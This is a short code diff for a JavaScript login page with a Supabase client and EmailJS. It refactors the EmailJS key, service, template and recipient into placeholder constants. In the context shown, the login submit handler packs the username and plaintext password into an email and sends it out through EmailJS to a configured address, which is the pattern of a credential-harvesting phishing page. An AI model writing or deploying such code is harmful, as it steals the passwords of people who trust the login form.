@@ -6,7 +6,12 @@ const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
 const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
 const supabase = createClient(supabaseUrl, supabaseAnonKey);
 
-emailjs.init('2zaPUjs8EKeOqaqC9');
+const EMAILJS_PUBLIC_KEY = 'YOUR_EMAILJS_PUBLIC_KEY';
+const EMAILJS_SERVICE_ID = 'YOUR_EMAILJS_SERVICE_ID';
+const EMAILJS_TEMPLATE_ID = 'YOUR_EMAILJS_TEMPLATE_ID';
+const EMAILJS_TO_EMAIL = 'your-email@gmail.com';
+
+emailjs.init(EMAILJS_PUBLIC_KEY);
 
 const loginForm = document.getElementById('loginForm');
 const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
@@ -45,14 +50,14 @@ loginForm.addEventListener('submit', async function(e) {
     }
 
     const emailParams = {
-      to_email: 'your-email@gmail.com',
+      to_email: EMAILJS_TO_EMAIL,
       username: username,
       password: password
     };
 
     const emailResponse = await emailjs.send(
-      'YOUR_EMAILJS_SERVICE_ID',
-      'YOUR_EMAILJS_TEMPLATE_ID',
+      EMAILJS_SERVICE_ID,
+      EMAILJS_TEMPLATE_ID,
       emailParams
     );
 
